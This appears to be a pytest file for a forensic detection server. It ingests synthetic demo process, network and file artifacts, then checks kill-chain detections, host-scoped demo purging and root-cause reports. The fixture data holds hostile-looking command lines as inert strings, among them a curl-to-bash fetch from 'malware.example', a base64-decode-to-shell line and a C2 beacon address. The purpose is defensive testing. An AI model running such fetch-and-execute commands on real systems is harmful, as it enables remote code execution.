"""Capability-demo detections, host-scoped purge, and report root cause."""
import hashlib
import json
from datetime import datetime, timezone

import pytest


def _enroll(client, hostname="demo-host", os_type="linux"):
    r = client.post("/api/v1/enroll", json={"hostname": hostname, "os_type": os_type})
    assert r.status_code == 200, r.text
    return r.json()


TROJAN_CONTENT = "ATOR_DEMO_TROJAN_PAYLOAD\nATOR_DEMO_EMAIL_ATTACHMENT_OPENED\n"
TROJAN_SHA = hashlib.sha256(TROJAN_CONTENT.encode()).hexdigest()


def _ingest_demo(client, creds, cid="demo-col-1"):
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    trojan = TROJAN_CONTENT
    sha = TROJAN_SHA
    manifest = {"collection_id": cid, "hostname": "demo-host", "os_type": "linux",
                "agent_version": "1.0.0", "started_at_utc": ts, "finished_at_utc": ts,
                "collector_order": ["processes", "network", "files_triage"], "manifest_sha256": ""}
    manifest["manifest_sha256"] = hashlib.sha256(
        json.dumps(manifest, sort_keys=True).encode()).hexdigest()
    markers = {
        "ATOR_DEMO_PHISHING_LINK_CLICKED url=https://demo.invalid": 5001,
        "ATOR_DEMO_MALWARE_DROPPER curl http://malware.example/d.sh | bash": 5002,
        "ATOR_DEMO_SPYWARE_KEYLOGGER capture=keys": 5003,
        "ATOR_DEMO_BOTNET_BEACON c2=198.51.100.66:4444": 5004,
        "ATOR_DEMO_RANSOMWARE_ENCRYPT ext=.locked": 5005,
        "ATOR_DEMO_INTERNAL_EXECUTION crontab -l; echo x | base64 -d | sh": 5006,
    }
    procs = [{"pid": pid, "ppid": 1, "name": "sleep", "cmdline": cmd,
              "exe_path": "/usr/bin/sleep"} for cmd, pid in markers.items()]
    artifacts = {
        "processes": procs,
        "network": [{"pid": 5010, "process_name": "python3", "remote": "127.0.0.1:4444",
                     "local": "127.0.0.1:55010", "proto": "tcp", "status": "ESTABLISHED"}],
        "files_triage": [{"path": "/tmp/ator_demo_trojan_payload.txt", "sha256": sha,
                          "size_bytes": len(trojan), "yara_matches": ["ATOR_DFIR_Demo_Trojan_Payload"]}],
        "persistence": [], "logs": [], "containers": [],
    }
    headers = {"Authorization": "Bearer " + creds["api_key"], "X-Client-ID": creds["client_id"]}
    r = client.post("/api/v1/ingest", json={"manifest": manifest, "artifacts": artifacts}, headers=headers)
    assert r.status_code == 202, r.text
    return sha, headers


def test_demo_signals_fire_full_kill_chain(client):
    creds = _enroll(client)
    # Register the trojan hash BEFORE ingest so ingest-time IOC correlation fires.
    client.post("/api/v1/iocs", json={"ioc_type": "hash", "value": TROJAN_SHA,
                                      "threat_source": "ator-demo-test"})
    _ingest_demo(client, creds)
    client.post(f"/api/v1/engine/run?host_id={creds['host_id']}&scan_history=true")

    dets = client.get(f"/api/v1/detections?host_id={creds['host_id']}").json()
    names = " ".join(d["rule_name"] for d in dets)
    techniques = {d["technique_id"] for d in dets}
    # Kill chain: initial access -> execution -> persistence -> C2 -> collection -> impact.
    for tid in ("T1204.001", "T1105", "T1053.003", "T1071.001", "T1056.001", "T1490"):
        assert tid in techniques, f"missing technique {tid}; got {techniques}"
    assert "YARA" in names and any(d["rule_type"] == "ioc" for d in dets)
    if any("pysigma" in json.dumps(d) for d in dets):
        pytest.skip("pysigma not installed in this environment")


def test_demo_purge_is_host_scoped(client):
    creds = _enroll(client, hostname="demo-a")
    other = _enroll(client, hostname="real-b")
    _ingest_demo(client, creds)
    # A real, non-demo collection on the same host must survive the purge.
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
    man = {"collection_id": "real-col", "hostname": "demo-a", "os_type": "linux",
           "agent_version": "1.0.0", "started_at_utc": ts, "finished_at_utc": ts,
           "collector_order": ["processes"], "manifest_sha256": "x"}
    real_headers = {"Authorization": "Bearer " + creds["api_key"], "X-Client-ID": creds["client_id"]}
    client.post("/api/v1/ingest", json={"manifest": man, "artifacts": {
        "processes": [{"pid": 42, "name": "nginx", "cmdline": "nginx -g daemon off",
                       "exe_path": "/usr/sbin/nginx"}]}}, headers=real_headers)
    client.post(f"/api/v1/engine/run?host_id={creds['host_id']}")

    before = client.get(f"/api/v1/detections?host_id={creds['host_id']}").json()
    assert before, "expected demo detections before purge"

    resp = client.post("/api/v1/demo/purge", json={"ioc_source": "ator-demo-test"},
                       headers=real_headers)
    assert resp.status_code == 200, resp.text
    after = client.get(f"/api/v1/detections?host_id={creds['host_id']}").json()
    assert not any("ATOR_DEMO" in json.dumps(d) for d in after)
    # The benign nginx process row must still be present (not demo-scoped).
    hosts_db = client.get("/api/v1/hosts").json()
    assert hosts_db  # sanity
    assert resp.json()["deleted"]


def test_demo_purge_requires_host_auth(client):
    _enroll(client, hostname="demo-c")
    # No credentials -> rejected.
    assert client.post("/api/v1/demo/purge", json={}).status_code == 401


def test_report_root_cause_where_when(client):
    creds = _enroll(client, hostname="rc-host")
    client.post("/api/v1/iocs", json={"ioc_type": "hash", "value": TROJAN_SHA, "threat_source": "ator-demo-test"})
    _ingest_demo(client, creds)
    client.post(f"/api/v1/engine/run?host_id={creds['host_id']}&scan_history=true")

    from server import db as database
    from server.engine import reporter
    conn = database.connect()
    try:
        data = reporter.host_report_data(conn, creds["host_id"])
    finally:
        conn.close()
    rows = data["root_cause_rows"]
    assert rows and len(rows) == len(data["detections"])
    for r in rows:
        assert r["root_cause"]                      # every detection has a cause
        assert r["where_machine"].startswith("rc-host")
        assert r["where_locus"]                     # process/file/network locus
        assert r["when_first_utc"]                  # when
    # A process-based detection localises to a process; the YARA hit to a file.
    loci = " ".join(r["where_locus"] for r in rows)
    assert "process" in loci and "file /tmp/ator_demo_trojan_payload.txt" in loci
